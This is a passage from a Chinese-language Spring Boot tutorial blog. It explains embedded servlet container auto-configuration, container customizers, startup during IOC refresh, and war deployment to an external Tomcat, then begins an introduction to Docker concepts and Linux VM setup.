class="meta">@ConditionalOnClass</span>(&#123; Servlet<span class="class">.<span class="keyword">class</span>, <span class="title">Server</span>.<span class="title">class</span>, <span class="title">Loader</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class"><span class="title">WebAppContext</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnMissingBean</span>(<span class="title">value</span> </span>= EmbeddedServletContainerFactory<span class="class">.<span class="keyword">class</span>, <span class="title">search</span> </span>= SearchStrategy.CURRENT)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EmbeddedJetty</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> JettyEmbeddedServletContainerFactory <span class="title">jettyEmbeddedServletContainerFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> JettyEmbeddedServletContainerFactory();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Nested configuration if Undertow is being used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(&#123; Servlet<span class="class">.<span class="keyword">class</span>, <span class="title">Undertow</span>.<span class="title">class</span>, <span class="title">SslClientAuthMode</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnMissingBean</span>(<span class="title">value</span> </span>= EmbeddedServletContainerFactory<span class="class">.<span class="keyword">class</span>, <span class="title">search</span> </span>= SearchStrategy.CURRENT)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EmbeddedUndertow</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> UndertowEmbeddedServletContainerFactory <span class="title">undertowEmbeddedServletContainerFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> UndertowEmbeddedServletContainerFactory();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1）、EmbeddedServletContainerFactory（嵌入式Servlet容器工厂）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">EmbeddedServletContainerFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//获取嵌入式的Servlet容器</span></span><br><span class="line">   <span class="function">EmbeddedServletContainer <span class="title">getEmbeddedServletContainer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">         ServletContextInitializer... initializers)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302144835.png" alt></p><p>2）、EmbeddedServletContainer：（嵌入式的Servlet容器）</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302144910.png" alt></p><p>3）、以<strong>TomcatEmbeddedServletContainerFactory</strong>为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> EmbeddedServletContainer <span class="title">getEmbeddedServletContainer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      ServletContextInitializer... initializers)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建一个Tomcat</span></span><br><span class="line">   Tomcat tomcat = <span class="keyword">new</span> Tomcat();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//配置Tomcat的基本环节</span></span><br><span class="line">   File baseDir = (<span class="keyword">this</span>.baseDirectory != <span class="keyword">null</span> ? <span class="keyword">this</span>.baseDirectory</span><br><span class="line">         : createTempDir(<span class="string">"tomcat"</span>));</span><br><span class="line">   tomcat.setBaseDir(baseDir.getAbsolutePath());</span><br><span class="line">   Connector connector = <span class="keyword">new</span> Connector(<span class="keyword">this</span>.protocol);</span><br><span class="line">   tomcat.getService().addConnector(connector);</span><br><span class="line">   customizeConnector(connector);</span><br><span class="line">   tomcat.setConnector(connector);</span><br><span class="line">   tomcat.getHost().setAutoDeploy(<span class="keyword">false</span>);</span><br><span class="line">   configureEngine(tomcat.getEngine());</span><br><span class="line">   <span class="keyword">for</span> (Connector additionalConnector : <span class="keyword">this</span>.additionalTomcatConnectors) &#123;</span><br><span class="line">      tomcat.getService().addConnector(additionalConnector);</span><br><span class="line">   &#125;</span><br><span class="line">   prepareContext(tomcat.getHost(), initializers);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将配置好的Tomcat传入进去，返回一个EmbeddedServletContainer；并且启动Tomcat服务器</span></span><br><span class="line">   <span class="keyword">return</span> getTomcatEmbeddedServletContainer(tomcat);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4）、我们对嵌入式容器的配置修改是怎么生效？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerProperties、EmbeddedServletContainerCustomizer</span><br></pre></td></tr></table></figure><p><strong>EmbeddedServletContainerCustomizer</strong>：定制器帮我们修改了Servlet容器的配置？</p><p>怎么修改的原理？</p><p>5）、容器中导入了<strong>EmbeddedServletContainerCustomizerBeanPostProcessor</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化之前</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">postProcessBeforeInitialization</span><span class="params">(Object bean, String beanName)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">    <span class="comment">//如果当前初始化的是一个ConfigurableEmbeddedServletContainer类型的组件</span></span><br><span class="line">   <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> ConfigurableEmbeddedServletContainer) &#123;</span><br><span class="line">       <span class="comment">//</span></span><br><span class="line">      postProcessBeforeInitialization((ConfigurableEmbeddedServletContainer) bean);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postProcessBeforeInitialization</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">ConfigurableEmbeddedServletContainer bean)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取所有的定制器，调用每一个定制器的customize方法来给Servlet容器进行属性赋值；</span></span><br><span class="line">    <span class="keyword">for</span> (EmbeddedServletContainerCustomizer customizer : getCustomizers()) &#123;</span><br><span class="line">        customizer.customize(bean);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Collection&lt;EmbeddedServletContainerCustomizer&gt; <span class="title">getCustomizers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.customizers == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Look up does not include the parent context</span></span><br><span class="line">        <span class="keyword">this</span>.customizers = <span class="keyword">new</span> ArrayList&lt;EmbeddedServletContainerCustomizer&gt;(</span><br><span class="line">            <span class="keyword">this</span>.beanFactory</span><br><span class="line">            <span class="comment">//从容器中获取所有这葛类型的组件：EmbeddedServletContainerCustomizer</span></span><br><span class="line">            <span class="comment">//定制Servlet容器，给容器中可以添加一个EmbeddedServletContainerCustomizer类型的组件</span></span><br><span class="line">            .getBeansOfType(EmbeddedServletContainerCustomizer<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">                            <span class="title">false</span>, <span class="title">false</span>)</span></span><br><span class="line"><span class="class">            .<span class="title">values</span>())</span>;</span><br><span class="line">        Collections.sort(<span class="keyword">this</span>.customizers, AnnotationAwareOrderComparator.INSTANCE);</span><br><span class="line">        <span class="keyword">this</span>.customizers = Collections.unmodifiableList(<span class="keyword">this</span>.customizers);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.customizers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ServerProperties也是定制器</span><br></pre></td></tr></table></figure><p>步骤：</p><p>1）、SpringBoot根据导入的依赖情况，给容器中添加相应的EmbeddedServletContainerFactory【TomcatEmbeddedServletContainerFactory】</p><p>2）、容器中某个组件要创建对象就会惊动后置处理器；EmbeddedServletContainerCustomizerBeanPostProcessor；</p><p>只要是嵌入式的Servlet容器工厂，后置处理器就工作；</p><p>3）、后置处理器，从容器中获取所有的<strong>EmbeddedServletContainerCustomizer</strong>，调用定制器的定制方法</p><p>###5）、嵌入式Servlet容器启动原理；</p><p>什么时候创建嵌入式的Servlet容器工厂？什么时候获取嵌入式的Servlet容器并启动Tomcat；</p><p>获取嵌入式的Servlet容器工厂：</p><p>1）、SpringBoot应用启动运行run方法</p><p>2）、refreshContext(context);SpringBoot刷新IOC容器【创建IOC容器对象，并初始化容器，创建容器中的每一个组件】；如果是web应用创建<strong>AnnotationConfigEmbeddedWebApplicationContext</strong>，否则：<strong>AnnotationConfigApplicationContext</strong></p><p>3）、refresh(context);<strong>刷新刚才创建好的ioc容器；</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException </span>&#123;</span><br><span class="line">   <span class="keyword">synchronized</span> (<span class="keyword">this</span>.startupShutdownMonitor) &#123;</span><br><span class="line">      <span class="comment">// Prepare this context for refreshing.</span></span><br><span class="line">      prepareRefresh();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Tell the subclass to refresh the internal bean factory.</span></span><br><span class="line">      ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Prepare the bean factory for use in this context.</span></span><br><span class="line">      prepareBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// Allows post-processing of the bean factory in context subclasses.</span></span><br><span class="line">         postProcessBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Invoke factory processors registered as beans in the context.</span></span><br><span class="line">         invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Register bean processors that intercept bean creation.</span></span><br><span class="line">         registerBeanPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize message source for this context.</span></span><br><span class="line">         initMessageSource();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize event multicaster for this context.</span></span><br><span class="line">         initApplicationEventMulticaster();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize other special beans in specific context subclasses.</span></span><br><span class="line">         onRefresh();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Check for listener beans and register them.</span></span><br><span class="line">         registerListeners();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Instantiate all remaining (non-lazy-init) singletons.</span></span><br><span class="line">         finishBeanFactoryInitialization(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Last step: publish corresponding event.</span></span><br><span class="line">         finishRefresh();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">         <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Exception encountered during context initialization - "</span> +</span><br><span class="line">                  <span class="string">"cancelling refresh attempt: "</span> + ex);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Destroy already created singletons to avoid dangling resources.</span></span><br><span class="line">         destroyBeans();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Reset 'active' flag.</span></span><br><span class="line">         cancelRefresh(ex);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Propagate exception to caller.</span></span><br><span class="line">         <span class="keyword">throw</span> ex;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="comment">// Reset common introspection caches in Spring's core, since we</span></span><br><span class="line">         <span class="comment">// might not ever need metadata for singleton beans anymore...</span></span><br><span class="line">         resetCommonCaches();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4）、  onRefresh(); web的ioc容器重写了onRefresh方法</p><p>5）、webioc容器会创建嵌入式的Servlet容器；<strong>createEmbeddedServletContainer</strong>();</p><p><strong>6）、获取嵌入式的Servlet容器工厂：</strong></p><p>EmbeddedServletContainerFactory containerFactory = getEmbeddedServletContainerFactory();</p><p>​    从ioc容器中获取EmbeddedServletContainerFactory 组件；<strong>TomcatEmbeddedServletContainerFactory</strong>创建对象，后置处理器一看是这个对象，就获取所有的定制器来先定制Servlet容器的相关配置；</p><p>7）、<strong>使用容器工厂获取嵌入式的Servlet容器</strong>：this.embeddedServletContainer = containerFactory      .getEmbeddedServletContainer(getSelfInitializer());</p><p>8）、嵌入式的Servlet容器创建对象并启动Servlet容器；</p><p><strong>先启动嵌入式的Servlet容器，再将ioc容器中剩下没有创建出的对象获取出来；</strong></p><p><strong>==IOC容器启动创建嵌入式的Servlet容器==</strong></p><h2><span id="9-使用外置的servlet容器">9、使用外置的Servlet容器</span></h2><p>嵌入式Servlet容器：应用打成可执行的jar</p><p>​        优点：简单、便携；</p><p>​        缺点：默认不支持JSP、优化定制比较复杂（使用定制器【ServerProperties、自定义EmbeddedServletContainerCustomizer】，自己编写嵌入式Servlet容器的创建工厂【EmbeddedServletContainerFactory】）；</p><p>外置的Servlet容器：外面安装Tomcat—应用war包的方式打包；</p><h3><span id="步骤">步骤</span></h3><p>1）、必须创建一个war项目；（利用idea创建好目录结构）</p><p>2）、将嵌入式的Tomcat指定为provided；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3）、必须编写一个<strong>SpringBootServletInitializer</strong>的子类，并调用configure方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletInitializer</span> <span class="keyword">extends</span> <span class="title">SpringBootServletInitializer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> SpringApplicationBuilder <span class="title">configure</span><span class="params">(SpringApplicationBuilder application)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//传入SpringBoot应用的主程序</span></span><br><span class="line">      <span class="keyword">return</span> application.sources(SpringBoot04WebJspApplication<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4）、启动服务器就可以使用；</p><h3><span id="原理">原理</span></h3><p>jar包：执行SpringBoot主类的main方法，启动ioc容器，创建嵌入式的Servlet容器；</p><p>war包：启动服务器，<strong>服务器启动SpringBoot应用</strong>【SpringBootServletInitializer】，启动ioc容器；</p><p>servlet3.0（Spring注解版）：</p><p>8.2.4 Shared libraries / runtimes pluggability：</p><p>规则：</p><p>​    1）、服务器启动（web应用启动）会创建当前web应用里面每一个jar包里面ServletContainerInitializer实例：</p><p>​    2）、ServletContainerInitializer的实现放在jar包的META-INF/services文件夹下，有一个名为javax.servlet.ServletContainerInitializer的文件，内容就是ServletContainerInitializer的实现类的全类名</p><p>​    3）、还可以使用@HandlesTypes，在应用启动的时候加载我们感兴趣的类；</p><p>流程：</p><p>1）、启动Tomcat</p><p>2）、org\springframework\spring-web\4.3.14.RELEASE\spring-web-4.3.14.RELEASE.jar!\META-INF\services\javax.servlet.ServletContainerInitializer：</p><p>Spring的web模块里面有这个文件：<strong>org.springframework.web.SpringServletContainerInitializer</strong></p><p>3）、SpringServletContainerInitializer将@HandlesTypes(WebApplicationInitializer.class)标注的所有这个类型的类都传入到onStartup方法的Set&lt;Class&lt;?&gt;&gt;；为这些WebApplicationInitializer类型的类创建实例；</p><p>4）、每一个WebApplicationInitializer都调用自己的onStartup；</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302221835.png" alt></p><p>5）、相当于我们的SpringBootServletInitializer的类会被创建对象，并执行onStartup方法</p><p>6）、SpringBootServletInitializer实例执行onStartup的时候会createRootApplicationContext；创建容器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> WebApplicationContext <span class="title">createRootApplicationContext</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      ServletContext servletContext)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//1、创建SpringApplicationBuilder</span></span><br><span class="line">   SpringApplicationBuilder builder = createSpringApplicationBuilder();</span><br><span class="line">   StandardServletEnvironment environment = <span class="keyword">new</span> StandardServletEnvironment();</span><br><span class="line">   environment.initPropertySources(servletContext, <span class="keyword">null</span>);</span><br><span class="line">   builder.environment(environment);</span><br><span class="line">   builder.main(getClass());</span><br><span class="line">   ApplicationContext parent = getExistingRootWebApplicationContext(servletContext);</span><br><span class="line">   <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.logger.info(<span class="string">"Root context already created (using as parent)."</span>);</span><br><span class="line">      servletContext.setAttribute(</span><br><span class="line">            WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="keyword">null</span>);</span><br><span class="line">      builder.initializers(<span class="keyword">new</span> ParentContextApplicationContextInitializer(parent));</span><br><span class="line">   &#125;</span><br><span class="line">   builder.initializers(</span><br><span class="line">         <span class="keyword">new</span> ServletContextApplicationContextInitializer(servletContext));</span><br><span class="line">   builder.contextClass(AnnotationConfigEmbeddedWebApplicationContext<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用configure方法，子类重写了这个方法，将SpringBoot的主程序类传入了进来</span></span><br><span class="line">   builder = configure(builder);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//使用builder创建一个Spring应用</span></span><br><span class="line">   SpringApplication application = builder.build();</span><br><span class="line">   <span class="keyword">if</span> (application.getSources().isEmpty() &amp;&amp; AnnotationUtils</span><br><span class="line">         .findAnnotation(getClass(), Configuration<span class="class">.<span class="keyword">class</span>) !</span>= <span class="keyword">null</span>) &#123;</span><br><span class="line">      application.getSources().add(getClass());</span><br><span class="line">   &#125;</span><br><span class="line">   Assert.state(!application.getSources().isEmpty(),</span><br><span class="line">         <span class="string">"No SpringApplication sources have been defined. Either override the "</span></span><br><span class="line">               + <span class="string">"configure method or add an @Configuration annotation"</span>);</span><br><span class="line">   <span class="comment">// Ensure error pages are registered</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.registerErrorPageFilter) &#123;</span><br><span class="line">      application.getSources().add(ErrorPageFilterConfiguration<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//启动Spring应用</span></span><br><span class="line">   <span class="keyword">return</span> run(application);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>7）、Spring的应用就启动并且创建IOC容器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title">run</span><span class="params">(String... args)</span> </span>&#123;</span><br><span class="line">   StopWatch stopWatch = <span class="keyword">new</span> StopWatch();</span><br><span class="line">   stopWatch.start();</span><br><span class="line">   ConfigurableApplicationContext context = <span class="keyword">null</span>;</span><br><span class="line">   FailureAnalyzers analyzers = <span class="keyword">null</span>;</span><br><span class="line">   configureHeadlessProperty();</span><br><span class="line">   SpringApplicationRunListeners listeners = getRunListeners(args);</span><br><span class="line">   listeners.starting();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      ApplicationArguments applicationArguments = <span class="keyword">new</span> DefaultApplicationArguments(</span><br><span class="line">            args);</span><br><span class="line">      ConfigurableEnvironment environment = prepareEnvironment(listeners,</span><br><span class="line">            applicationArguments);</span><br><span class="line">      Banner printedBanner = printBanner(environment);</span><br><span class="line">      context = createApplicationContext();</span><br><span class="line">      analyzers = <span class="keyword">new</span> FailureAnalyzers(context);</span><br><span class="line">      prepareContext(context, environment, listeners, applicationArguments,</span><br><span class="line">            printedBanner);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//刷新IOC容器</span></span><br><span class="line">      refreshContext(context);</span><br><span class="line">      afterRefresh(context, applicationArguments);</span><br><span class="line">      listeners.finished(context, <span class="keyword">null</span>);</span><br><span class="line">      stopWatch.stop();</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.logStartupInfo) &#123;</span><br><span class="line">         <span class="keyword">new</span> StartupInfoLogger(<span class="keyword">this</span>.mainApplicationClass)</span><br><span class="line">               .logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> context;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      handleRunFailure(context, listeners, analyzers, ex);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(ex);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>==启动Servlet容器，再启动SpringBoot应用==</strong></p><h1><span id="五-docker">五、Docker</span></h1><h2><span id="1-简介">1、简介</span></h2><p><strong>Docker</strong>是一个开源的应用容器引擎；是一个轻量级容器技术；</p><p>Docker支持将软件编译成一个镜像；然后在镜像中各种软件做好配置，将镜像发布出去，其他使用者可以直接使用这个镜像；</p><p>运行中的这个镜像称为容器，容器启动是非常快速的。</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180303145450.png" alt></p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180303145531.png" alt></p><h2><span id="2-核心概念">2、核心概念</span></h2><p>docker主机(Host)：安装了Docker程序的机器（Docker直接安装在操作系统之上）；</p><p>docker客户端(Client)：连接docker主机进行操作；</p><p>docker仓库(Registry)：用来保存各种打包好的软件镜像；</p><p>docker镜像(Images)：软件打包好的镜像；放在docker仓库中；</p><p>docker容器(Container)：镜像启动后的实例称为一个容器；容器是独立运行的一个或一组应用</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180303165113.png" alt></p><p>使用Docker的步骤：</p><p>1）、安装Docker</p><p>2）、去Docker仓库找到这个软件对应的镜像；</p><p>3）、使用Docker运行这个镜像，这个镜像就会生成一个Docker容器；</p><p>4）、对容器的启动停止就是对软件的启动停止；</p><h2><span id="3-安装docker">3、安装Docker</span></h2><h4><span id="1-安装linux虚拟机">1）、安装linux虚拟机</span></h4><p>​    1）、VMWare、VirtualBox（安装）；</p><p>​    2）、导入虚拟机文件centos7-atguigu.ova；</p><p>​    3）、双击启动linux虚拟机;使用  root/ 123456登陆</p><p>​    4）、使用客户端连接linux服务器进行命令操作；</p><p>​    5）、设置虚拟机网络；</p><p>​        桥接网络===选好网卡====接入网线；</p><p>​    6）、设置好网络以后使用命令重启虚拟机的网络</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure><p>​    7）、查看linux的ip地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure><p>​    8）、使用客户端连接linux；</p><h4><span 